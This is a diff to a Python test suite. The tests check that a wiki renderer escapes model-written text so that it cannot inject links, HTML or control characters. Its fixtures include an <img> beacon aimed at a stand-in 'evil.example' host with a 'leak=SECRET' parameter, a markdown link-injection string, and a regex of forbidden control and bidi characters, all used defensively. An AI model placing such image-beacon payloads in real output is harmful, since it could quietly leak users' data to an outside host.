@@ -124,9 +124,9 @@ class RegionRobustnessTest(unittest.TestCase):
         self.assertIn("after", out)
 
     def test_bom_before_start_marker(self):
-        t = "﻿<!-- ember:items -->\nold\n<!-- /ember:items -->\nafter\n"
+        t = "\ufeff<!-- ember:items -->\nold\n<!-- /ember:items -->\nafter\n"
         out = self._assert_stable(t)
-        self.assertTrue(out.startswith("﻿<!-- ember:items -->"))
+        self.assertTrue(out.startswith("\ufeff<!-- ember:items -->"))
         self.assertIn("after", out)
 
     def test_crlf_files_still_work(self):
@@ -145,7 +145,7 @@ class EscapingTest(WikiTestCase):
             {"page": "people/bob", "title": "x](https://evil.example", "open": 0}])
         text = self.read("index.md")
         self.assertIn("[Acme \\\\](pages/people/sam.md)", text)
-        self.assertIn("- [x\\](https://evil.example](pages/people/bob.md)", text)
+        self.assertIn("- [x\\](https:​//evil.example](pages/people/bob.md)", text)   # autolink broken too
 
     def test_backslash_cannot_cancel_caret_escape(self):
         md = wikifs.render_items([dict(ITEM, text="a \\^it-deadbeef")], {})
@@ -327,6 +327,70 @@ class BriefReviewFixTest(WikiTestCase):
                 wikifs.write_brief(self.root, day, "x")
         briefs = os.path.join(self.root, "briefs")
         self.assertEqual(os.listdir(briefs) if os.path.isdir(briefs) else [], [])
+
+
+EVIL = ('Acme <img src="https://evil.example/px?leak=SECRET"> see www.evil.example '
+        'mail x@evil.example %% hidden %% $x$ #tag')
+# ESC/CSI, BEL, C1 CSI, DEL, bidi override + isolate, zero-width space/joiner, BOM, tag block
+CTRL_TEXT = "Sam\x1b[31m red\x07 \x9b2J\x7f \u202eevil\u202c \u2066iso\u2069 z\u200bw\u200dj\ufeff \U000e0041tag"
+
+
+class SinkEscapingTest(WikiTestCase):
+    """Every page/index sink renders model free text through inline()."""
+    def assert_inert(self, md):
+        self.assertNotIn("<img", md)
+        self.assertNotIn("https://", md)
+        self.assertNotIn("www.evil", md)
+        self.assertNotIn("@evil", md)
+        self.assertNotIn("%%", md)
+        self.assertNotRegex(md, r"(?<!\\)\$")
+        self.assertNotRegex(md, r"(?<!\\)#tag")
+        self.assertIn("&lt;img src=", md)                                 # still readable
+
+    def assert_no_ctrl(self, md):
+        self.assertIsNone(re.search(r"[\x00-\x09\x0b-\x1f\x7f-\x9f\u061c\u200b-\u200f\u202a-\u202e"
+                                    r"\u2060\u2066-\u2069\ufeff\U000e0000-\U000e007f]", md), repr(md))
+        self.assertIn("Sam red", md)
+
+    def test_render_items_text_owner_due(self):
+        md = wikifs.render_items([dict(ITEM, text=EVIL, owner=EVIL, due=EVIL)], {})
+        self.assert_inert(md)
+        self.assertEqual(wikifs.render_items([ITEM], EV).splitlines()[0],
+                         "- [ ] Waiting on Sam for the signed SOW — Sam, Friday · [^r-a1b2c3d4e5f6] ^it-8f2c1a2b")
+
+    def test_write_page_title_and_summary(self):
+        wikifs.write_page(self.root, "projects/acme", EVIL, EVIL, "")
+        self.assert_inert(self.read("pages", "projects", "acme.md"))
+
+    def test_write_index_title_and_summary(self):
+        wikifs.write_index(self.root, [{"page": "projects/acme", "title": EVIL, "summary": EVIL, "open": 1}])
+        self.assert_inert(self.read("index.md"))
+
+    def test_init_wiki_title(self):
+        root = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, root, True)
+        wikifs.init_wiki(root, EVIL, "# Schema\n")
+        with open(os.path.join(root, "index.md"), encoding="utf-8") as f:
+            self.assert_inert(f.read())
+
+    def test_control_characters_are_dropped_everywhere(self):
+        self.assertEqual(wikifs._one_line("a\tb\nc\r\nd", 100), "a b c d")
+        for out in (wikifs.inline(CTRL_TEXT, 300), wikifs._one_line(CTRL_TEXT, 300),
+                    wikifs.footnote_quote(CTRL_TEXT),
+                    wikifs.render_items([dict(ITEM, text=CTRL_TEXT, owner=CTRL_TEXT)], {})):
+            self.assert_no_ctrl(out)
+        wikifs.write_page(self.root, "projects/acme", CTRL_TEXT, CTRL_TEXT, "")
+        wikifs.write_index(self.root, [{"page": "projects/acme", "title": CTRL_TEXT, "summary": CTRL_TEXT}])
+        wikifs.append_log(self.root, dt.datetime(2026, 10, 5), "brief", CTRL_TEXT)
+        for parts in (("pages", "projects", "acme.md"), ("index.md",), ("log.md",)):
+            self.assert_no_ctrl(self.read(*parts))
+
+    def test_inline_still_breaks_autolinks_after_dropping_zero_width(self):
+        self.assertEqual(wikifs.inline("h\u200bttps://e.example", 100), "https:\u200b//e.example")
+
+    def test_cli_uses_the_same_control_set(self):
+        import embers_cli
+        self.assertIs(embers_cli._CTRL, wikifs.CTRL)
 
 
 if __name__ == "__main__":
